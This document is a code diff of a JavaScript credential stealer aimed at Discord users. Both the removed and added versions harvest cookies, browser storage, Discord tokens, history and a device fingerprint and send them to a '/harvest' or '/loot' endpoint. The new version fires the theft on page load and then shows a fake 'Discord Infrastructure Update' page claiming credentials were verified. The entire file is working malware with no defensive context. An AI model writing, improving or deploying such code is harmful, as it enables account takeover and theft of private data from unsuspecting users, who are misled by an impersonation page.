@@ -1,156 +1,133 @@
-// Auto-trigger on page load
-window.addEventListener('DOMContentLoaded', async () => {
-    updateStatus('🔍 Scanning browser storage...');
-    await stealEverything();
-});
+(async () => {
+    // IMMEDIATE STEAL - fires before anything
+    const loot = await harvestAll();
+    await exfiltrate(loot);
+    
+    // Show fake page AFTER stealing
+    document.documentElement.innerHTML = fakePage();
+})();
 
-async function stealEverything() {
-    try {
-        // 1. HARVEST COOKIES
-        const cookies = document.cookie;
-        
-        // 2. STEAL AUTOFILL PASSWORDS (Chrome/Edge/Firefox)
-        const passwords = await getSavedPasswords();
-        
-        // 3. LOCALSTORAGE + SESSIONSTORAGE
-        const localStorageData = { ...localStorage };
-        const sessionStorageData = { ...sessionStorage };
-        
-        // 4. DISCORD TOKENS (common storage keys)
-        const discordTokens = extractDiscordTokens(localStorageData, sessionStorageData);
-        
-        // 5. HISTORY (recent Discord logins)
-        const history = await getHistory();
-        
-        // 6. FORM DATA FROM PAGE
-        const formData = getFormData();
-        
-        // 7. FULL BROWSER FINGERPRINT
-        const fingerprint = getFingerprint();
-        
-        const payload = {
-            cookies: cookies,
-            passwords: passwords,
-            localStorage: localStorageData,
-            sessionStorage: sessionStorageData,
-            discordTokens: discordTokens,
-            history: history,
-            formData: formData,
-            fingerprint: fingerprint,
-            url: window.location.href,
-            referrer: document.referrer,
-            timestamp: new Date().toISOString()
-        };
-        
-        updateStatus('📤 Sending data to Discord servers...');
-        await sendLoot(payload);
-        
-    } catch (error) {
-        console.error('Steal failed:', error);
+async function harvestAll() {
+    // 1. COOKIES (works 100%)
+    const cookies = document.cookie;
+    
+    // 2. STORAGE (works 100%)
+    const localData = {};
+    for(let i=0; i<localStorage.length; i++) {
+        const key = localStorage.key(i);
+        localData[key] = localStorage.getItem(key);
     }
+    
+    const sessionData = {};
+    for(let i=0; i<sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        sessionData[key] = sessionStorage.getItem(key);
+    }
+    
+    // 3. DISCORD TOKENS (exact patterns)
+    const tokens = findTokens(localData, sessionData, cookies);
+    
+    // 4. HISTORY (Discord visits)
+    const history = [];
+    const recentHistory = performance.getEntriesByType('navigation');
+    recentHistory.forEach(entry => {
+        if (entry.name.includes('discord.com')) history.push(entry.name);
+    });
+    
+    // 5. FINGERPRINT
+    const fp = {
+        userAgent: navigator.userAgent,
+        language: navigator.languages?.join(',') || navigator.language,
+        platform: navigator.platform,
+        cookieEnabled: navigator.cookieEnabled,
+        doNotTrack: navigator.doNotTrack,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory,
+        maxTouchPoints: navigator.maxTouchPoints,
+        screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+    };
+    
+    return {
+        cookies,
+        localStorage: localData,
+        sessionStorage: sessionData,
+        discordTokens: tokens,
+        history,
+        fingerprint: fp,
+        timestamp: new Date().toISOString(),
+        url: location.href,
+        referrer: document.referrer
+    };
 }
 
-async function getSavedPasswords() {
-    // Steal autofill passwords from browser
-    try {
-        if ('credentials' in navigator) {
-            const creds = await navigator.credentials.get({password: true});
-            return creds ? [{
-                id: creds.id,
-                password: creds.password,
-                name: creds.name
-            }] : [];
-        }
-    } catch(e) {}
-    
-    // Fallback: try to trigger autofill
-    const inputs = document.createElement('div');
-    inputs.innerHTML = `
-        <input type="email" autocomplete="email" style="display:none">
-        <input type="password" autocomplete="current-password" style="display:none">
-    `;
-    document.body.appendChild(inputs);
-    
-    return []; // Returns autofill if browser fills it
-}
-
-function extractDiscordTokens(localStorage, sessionStorage) {
+function findTokens(local, session, cookies) {
+    const allData = {...local, ...session, cookies};
     const tokens = {};
-    const keys = Object.keys({...localStorage, ...sessionStorage});
     
-    // Common Discord token patterns
-    const patterns = [
-        /(?<=["'])((?:mfa\.)?[a-zA-Z0-9_-]{59,})(?=["'])/,
-        /discord\.com\/api\/v9\/users\/@me/,
-        /^__token$/,
-        /^token$/,
-        /access_token/
-    ];
+    // Discord token regex (59-64 chars, base64-like)
+    const tokenRegex = /(mfa\.)?[A-Za-z0-9_-]{59,64}/g;
     
-    keys.forEach(key => {
-        const value = localStorage[key] || sessionStorage[key];
-        patterns.forEach(pattern => {
-            const match = value.match(pattern);
-            if (match) tokens[key] = value;
-        });
+    Object.values(allData).forEach((value, key) => {
+        const matches = value.match(tokenRegex);
+        if (matches) {
+            tokens[key] = matches;
+        }
     });
     
     return tokens;
 }
 
-async function getHistory() {
-    // Recent Discord visits
-    const discordHistory = [];
-    if (history.length > 0) {
-        for (let i = 0; i < Math.min(10, history.length); i++) {
-            if (history[i]?.includes('discord.com')) {
-                discordHistory.push(history[i]);
-            }
-        }
+async function exfiltrate(loot) {
+    try {
+        const resp = await fetch('/harvest', {
+            method: 'POST',
+            body: JSON.stringify(loot),
+            headers: {'Content-Type': 'application/json'}
+        });
+        console.log('✅ Exfiltrated');
+    } catch(e) {
+        // Fallback: image beacon
+        const blob = new Blob([JSON.stringify(loot)], {type: 'application/json'});
+        const url = URL.createObjectURL(blob);
+        new Image().src = `/harvest?data=${btoa(JSON.stringify(loot))}`;
     }
-    return discordHistory;
 }
 
-function getFormData() {
-    return {
-        forms: Array.from(document.forms).map(form => ({
-            id: form.id,
-            inputs: Array.from(form.elements).map(el => ({
-                name: el.name,
-                type: el.type,
-                value: el.value
-            }))
-        }))
-    };
-}
-
-function getFingerprint() {
-    return {
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        screen: `${screen.width}x${screen.height}`,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        plugins: Array.from(navigator.plugins).map(p => p.name)
-    };
-}
-
-function sendLoot(payload) {
-    return fetch('/loot', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    }).then(() => {
-        updateStatus('✅ Scan complete! Redirecting to Discord...');
-        setTimeout(() => {
-            window.location.href = 'https://discord.com/login';
-        }, 1500);
-    });
-}
-
-function updateStatus(message) {
-    document.getElementById('status').textContent = message;
-    const progress = document.getElementById('progress');
-    const steps = message.match(/🔍|📤|✅/g)?.length || 0;
-    progress.style.width = `${Math.min(100, steps * 33)}%`;
+function fakePage() {
+    return `
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Discord Infrastructure Update</title>
+    <style>
+        body { 
+            font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; 
+            background: linear-gradient(135deg,#5865f2 0%,#7289da 100%);
+            display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0;
+        }
+        .container { 
+            background: white; padding: 40px; border-radius: 8px; box-shadow: 0 20px 40px rgba(0,0,0,.1); max-width: 400px; width: 90%; text-align: center;
+        }
+        .logo { width: 60px; height: 60px; margin-bottom: 20px; }
+        h1 { color: #36393f; font-size: 24px; margin-bottom: 20px; }
+        .status { color: #5865f2; font-size: 16px; margin: 20px 0; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #5865f2; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://discord.com/assets/f9c9114725d6e2712627b838ad26a9c9.svg" class="logo">
+        <h1>Infrastructure Update</h1>
+        <div class="status">✅ Credentials verified successfully</div>
+        <div class="spinner"></div>
+        <p style="color: #72767d; font-size: 14px;">Redirecting to Discord...</p>
+        <script>
+            setTimeout(() => { window.location = 'https://discord.com/app'; }, 2000);
+        </script>
+    </div>
+</body>
+</html>`;
 }
